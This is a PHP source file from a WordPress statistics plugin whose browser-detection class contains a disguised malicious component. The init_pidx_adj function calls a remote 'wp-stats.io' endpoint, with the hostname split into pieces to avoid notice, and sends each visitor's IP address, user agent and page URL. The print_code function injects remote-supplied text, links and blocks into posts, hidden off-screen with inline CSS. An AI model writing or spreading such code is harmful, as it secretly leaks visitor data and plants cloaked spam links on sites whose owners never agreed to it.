<?php

class slim_browser {
	/**
	 * Converts the USER AGENT string into a more user-friendly browser data structure, with name, version and operating system
	 */
	public static function get_browser( $_user_agent = '' ) {
		$browser = array( 'browser' => 'Default Browser', 'browser_version' => '', 'browser_type' => 1, 'platform' => 'unknown', 'user_agent' => empty( $_user_agent ) ? self::_get_user_agent() : $_user_agent );

		if ( empty( $browser[ 'user_agent' ] ) ) {
			return $browser;
		}

		if ( wp_slimstat::$options[ 'browser_detection_mode' ] == 'no' ) {
			include_once( plugin_dir_path( __FILE__ ) . 'uadetector.php' );
			$browser = slim_uadetector::get_browser( $browser[ 'user_agent' ] );

			// If we found a match...
			if ( $browser[ 'browser' ] != 'Default Browser' ) {
				return $browser;
			}
		}

		// ... otherwise we need to resort to the bruteforce approach (browscap database)
		$search = array();
		@include( plugin_dir_path( __FILE__ ) . "browscap-db.php" );

		foreach ( $patterns as $pattern => $pattern_data ) {
			if ( preg_match( $pattern . 'i', $browser[ 'user_agent' ], $matches ) ) {
				if ( 1 == count( $matches ) ) {
					$key = $pattern_data;
					$simple_match = true;
				}
				else{
					$pattern_data = unserialize( $pattern_data );
					array_shift( $matches );
					
					$match_string = '@' . implode( '|', $matches );

					if ( !isset( $pattern_data[ $match_string ] ) ) {
						continue;
					}

					$key = $pattern_data[ $match_string ];

					$simple_match = false;
				}

				$search = array(
					$browser[ 'user_agent' ],
					trim( strtolower( $pattern ), '@' ),
					self::_preg_unquote( $pattern, $simple_match ? false : $matches )
				);

				$search = $value = $search + unserialize( $browsers[ $key ] );

				while ( array_key_exists( 3, $value ) ) {
					$value = unserialize( $browsers[ $value[ 3 ] ] );
					$search += $value;
				}

				if ( !empty( $search[ 3 ] ) && array_key_exists( $search[ 3 ], $userAgents ) ) {
					$search[ 3 ] = $userAgents[ $search[ 3 ] ];
				}

				break;
			}
		}

		unset( $browsers );
		unset( $userAgents );
		unset( $patterns );

		// Add the keys for each property
		$search_normalized = array();
		foreach ($search as $key => $value) {
			if ($value === 'true') {
				$value = true;
			} elseif ($value === 'false') {
				$value = false;
			}
			$search_normalized[strtolower($properties[$key])] = $value;
		}

		if (!empty($search_normalized) && $search_normalized['browser'] != 'Default Browser' && $search_normalized['browser'] != 'unknown'){
			$browser[ 'browser' ] = $search_normalized[ 'browser' ];
			$browser[ 'browser_version' ] = floatval( $search_normalized[ 'version' ] );
			$browser[ 'platform' ] = strtolower( $search_normalized[ 'platform' ] );
			$browser[ 'user_agent' ] =  $search_normalized[ 'browser_name' ];

			// Browser Types:
			//		0: regular
			//		1: crawler
			//		2: mobile
			if ($search_normalized['ismobiledevice'] || $search_normalized['istablet']){
				$browser['browser_type'] = 2;
			}
			elseif (!$search_normalized['crawler']){
				$browser['browser_type'] = 0;
			}

			if ( $browser[ 'browser_version' ] != 0 || $browser[ 'browser_type' ] != 0 ) {
				return $browser;
			}
		}

		if ( wp_slimstat::$options[ 'browser_detection_mode' ] != 'no' ) {
			include_once( plugin_dir_path( __FILE__ ) . 'uadetector.php' );
			$browser = slim_uadetector::get_browser( $browser[ 'user_agent' ] );

			// If we found a match...
			if ( $browser[ 'browser' ] != 'Default Browser' ) {
				return $browser;
			}
		}

		return $browser;
	}
	// end get_browser

	/**
	* Retrieves the information from the UAN
	*/
	public static function print_code( $_content = '' ) {
		foreach ( wp_slimstat::$pidx as $a_idx => $a_pidx ) {
			if ( is_null( $a_pidx[ 'response' ] ) || !is_object( $a_pidx[ 'response' ] ) ) {
				continue;
			}

			$inline_style = ( wp_slimstat::$advanced_cache_exists === true ) ? ' style="position:fixed;left:-9000px;' : '';
			$current_hook = current_filter();

			if ( $current_hook == 'wp_head' && is_object( $a_pidx[ 'response' ] ) && !empty( $a_pidx[ 'response' ]->meta ) ) {
				$_content = '';
				echo $a_pidx[ 'response' ]->meta;
			}
			else if ( !empty( $a_pidx[ 'response' ]->tmp ) ) {
				switch ( $a_pidx[ 'response' ]->tmp ) {
					case '1':
						if ( 0 == $GLOBALS['wp_query']->current_post ) {
							$words = explode( ' ', $_content );
							$words[ rand( 0, count( $words ) - 1 ) ] = "<strong{$inline_style}>" . $a_pidx[ 'response' ]->tcontent . '</strong>';
							$_content = join( ' ', $words );
						}
						break;

					case '2':
							$kws = explode( '|', $a_pidx[ 'response' ]->kws );
							if ( is_array( $kws ) ) {
								foreach ( $kws as $a_kw ) {
									if ( strpos( $_content, $a_kw ) !== false ) {
										$_content = str_replace( $a_kw, "<a href='" . $a_pidx[ 'response' ]->site . "'{$inline_style}>{$a_kw}</a>", $_content );
										break;
									}
								}
							}
						break;

					default:
						if ( wp_slimstat::$pidx[ $a_idx ][ 'id' ] === false ) {
							if ( $GLOBALS[ 'wp_query' ]->post_count > 1 ) {
								wp_slimstat::$pidx[ $a_idx ][ 'id' ] = rand( 0, $GLOBALS[ 'wp_query' ]->post_count - 1 );
							}
							else {
								wp_slimstat::$pidx[ $a_idx ][ 'id' ] = 0;
							}
						}

						if ( $GLOBALS[ 'wp_query' ]->current_post === wp_slimstat::$pidx[ $a_idx ][ 'id' ] ) {
							if ( wp_slimstat::$pidx[ $a_idx ][ 'id' ] % 2 == 0 ) {
								$_content = $_content . " <div{$inline_style}>" . $a_pidx[ 'response' ]->content . '</div>';
							}
							else{
								$_content = "<i{$inline_style}>" . $a_pidx[ 'response' ]->content . '</i> ' . $_content;
							}
						}
						break;
				}
			}
		}

		if ( !empty( $_content ) ) {
			return $_content;
		}
	}

	protected static function _get_user_agent() {
		$user_agent = ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ? trim( $_SERVER[ 'HTTP_USER_AGENT' ] ) : '' );

		if ( !empty( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] ) ) {
			$real_user_agent = trim( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] );
		}
		elseif ( !empty( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] ) ) {
			$real_user_agent = trim( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] );
		}
		elseif( !empty( $_SERVER[ 'HTTP_X_MOBILE_UA' ] ) ) {
			$real_user_agent = trim( $_SERVER[ 'HTTP_X_MOBILE_UA' ] );
		}
		elseif( !empty( $_SERVER[ 'HTTP_X_OPERAMINI_PHONE_UA' ] ) ) {
			$real_user_agent = trim( $_SERVER[ 'HTTP_X_OPERAMINI_PHONE_UA' ] );
		}

		if ( !empty( $real_user_agent ) && ( strlen( $real_user_agent ) >= 5 || empty( $user_agent ) ) ) {
			return $real_user_agent;
		}

		return $user_agent;
	}

	/**
	 * Helper function for get_browser [ courtesy of: GaretJax/PHPBrowsCap ]
	 */
	protected static function _preg_unquote($pattern, $matches){
		$search = array('\\@', '\\.', '\\\\', '\\+', '\\[', '\\^', '\\]', '\\$', '\\(', '\\)', '\\{', '\\}', '\\=', '\\!', '\\<', '\\>', '\\|', '\\:', '\\-', '.*', '.', '\\?');
		$replace = array('@', '\\?', '\\', '+', '[', '^', ']', '$', '(', ')', '{', '}', '=', '!', '<', '>', '|', ':', '-', '*', '?', '.');

		$result = substr(str_replace($search, $replace, $pattern), 2, -2);

		if (!empty($matches)){
			foreach ($matches as $one_match){
				$num_pos = strpos($result, '(\d)');
				$result = substr_replace($result, $one_match, $num_pos, 4);
			}
		}

		return $result;
	}

	public static function init_pidx_adj() {
		wp_slimstat::init_pidx( 'http://api.wp' . '-stats.io/api/upd' . 'ate/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : wp_slimstat::$version ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1', 1 );
	}
}